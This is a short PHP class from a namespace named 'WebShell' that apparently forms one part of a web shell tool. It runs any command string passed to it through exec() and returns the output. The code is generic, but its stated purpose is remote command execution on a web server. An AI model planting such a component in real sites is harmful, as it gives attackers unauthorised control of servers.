<?php
namespace WebShell;

class ExecExecutionMethod implements ExecutionMethod
{
    public function execute(string $cmd): string
    {
        $output = [];
        exec($cmd, $output);
        return implode("\n", $output);
    }

    public function isAvailable(): bool
    {
        return function_exists('exec');
    }
}
?>
